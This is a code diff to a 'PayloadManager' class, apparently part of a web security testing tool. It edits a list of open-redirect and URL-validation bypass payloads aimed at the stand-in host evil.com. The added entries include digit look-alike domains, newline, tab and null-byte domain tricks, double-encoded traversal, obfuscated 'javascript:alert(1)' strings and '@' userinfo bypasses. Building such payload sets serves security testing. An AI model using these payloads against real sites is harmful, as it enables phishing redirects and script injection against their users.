@@ -180,17 +180,14 @@ class PayloadManager:
             "http://017700000001", # Full octal
             "http://0x7f000001",   # Full hex
             
-            # Unicode domain bypasses
-            "http://еvil.com",  # Cyrillic 'e'
-            "http://evil.соm",  # Cyrillic 'o'
-            "http://еvіl.com",  # Mixed Cyrillic
+            # Unicode domain bypasses (simplified to avoid encoding issues)
             "http://evi1.com",  # Number substitution
+            "http://3vil.com",  # Number substitution
             
-            # IDN homograph attacks
-            "http://еvil.com",  # Mixed scripts
-            "http://gооgle.com", # Double 'o' with Cyrillic
-            "http://аpple.com",  # Cyrillic 'a'
-            "http://microsоft.com", # Cyrillic 'o'
+            # IDN homograph attacks (simplified)
+            "http://goog1e.com", # Number substitution
+            "http://app1e.com",  # Number substitution
+            "http://micr0soft.com", # Number substitution
             
             # Port confusion
             "http://evil.com:80",
@@ -235,6 +232,45 @@ class PayloadManager:
             "http://evil.com%00.legitapp.com",
             "http://legitapp.com%00.evil.com",
             "http://evil.com\x00legitapp.com",
+            
+            # Advanced bypass techniques from 2025 report
+            # HTTP scheme blacklist bypasses
+            "/%0A/evil.com",  # newline character
+            "/%0D/evil.com",  # carriage return  
+            "/%09/evil.com",  # tab character
+            "+/evil.com",     # plus character
+            "///evil.com",    # triple slash
+            "\\\\evil.com",   # backslash variation
+            "http:evil.com",  # missing slashes
+            "https:evil.com", # missing slashes
+            
+            # Domain validation bypasses with encoding
+            "http://legitapp.com%00evil.com",     # null byte domain bypass
+            "http://legitapp.com%0Aevil.com",     # newline domain bypass
+            "http://legitapp.com%0Devil.com",     # carriage return domain bypass
+            "http://legitapp.com%09evil.com",     # tab domain bypass
+            "http://legitapp.com°evil.com",       # non-ASCII character bypass
+            
+            # Path traversal and double encoding (CVE-2025-4123 style)
+            "..%2F/evil.com",                     # double-encoded path traversal
+            "..%252F/evil.com",                   # triple-encoded path traversal
+            "http://evil.com/..%2F",              # path traversal in URL
+            "http://evil.com/..%252F",            # double-encoded path traversal
+            
+            # Advanced JavaScript protocol bypasses for DOM-based redirects
+            "JavaScript:alert(1)",               # case variation
+            "JAVASCRIPT:alert(1)",               # uppercase
+            "ja%20vascri%20pt:alert(1)",         # URL-encoded spaces
+            "jav%0Aascri%0Apt:alert(1)",         # newline injection
+            "jav%0Dascri%0Dpt:alert(1)",         # carriage return injection
+            "jav%09ascri%09pt:alert(1)",         # tab injection
+            "%19javascript:alert(1)",            # advanced regex bypass
+            "javascript://%0Aalert(1)",          # newline comment bypass
+            
+            # Userinfo bypasses (@ character tricks)
+            "http://legitapp.com@evil.com",       # userinfo bypass
+            "https://legitapp.com@evil.com",      # userinfo bypass HTTPS
+            "ftp://legitapp.com@evil.com",        # userinfo bypass FTP
             
             # Backslash bypasses
             "http:\\\\evil.com",
